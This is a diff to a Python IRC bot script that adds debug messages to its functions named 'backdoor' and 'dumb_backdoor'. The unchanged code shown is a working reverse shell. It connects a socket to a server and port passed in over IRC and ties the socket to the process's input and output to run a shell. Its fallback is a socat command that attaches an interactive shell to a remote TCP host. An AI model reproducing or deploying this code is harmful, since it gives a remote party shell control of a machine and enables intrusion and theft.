@@ -3,16 +3,23 @@
 from rocksock import Rocksock, RocksockException
 from irc import RsIRC
 
+debug = False
+
 def print_exception(irc, channel, lines):
 	for line in lines.splitlines():
 		irc.privmsg(channel, line)
+
+def dprint(irc, channel, msg):
+	if debug: irc.privmsg(channel, "[DEBUG] " + msg)
 
 def dumb_backdoor(irc, channel, server, port):
 	from config import shell
 	import pty, socket, os
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	try:
+		dprint(irc, channel, "connect")
 		s.connect((server, port))
+		dprint(irc, channel, "connected!")
 		os.dup2(s.fileno(),0)
 		os.dup2(s.fileno(),1)
 		os.dup2(s.fileno(),2)
@@ -28,6 +35,8 @@ def backdoor(irc, channel, server, port):
 	import traceback
 	from config import shell
 
+	dprint(irc, channel, "running backdoor to %s:%d"%(server, port))
+
 	pid = os.fork()
 	if pid == 0: #child
 		cmd = "socat exec:'%s -i',pty,stderr,setsid,sigint,sane tcp:%s:%d"%(shell, server, port)
@@ -36,7 +45,9 @@ def backdoor(irc, channel, server, port):
 			os.execvp('socat', cmdarr)
 			#os.execlp('/bin/sh', '/bin/sh', '-c', cmd)
 		except OSError as e:
+			dprint(irc, channel, "got socat error")
 			if e.errno == os.errno.ENOENT:
+				dprint(irc, channel, "trying dumb backdoor")
 				dumb_backdoor(irc, channel, server, port)
 			else:
 				print_exception(irc, channel, traceback.format_exc())
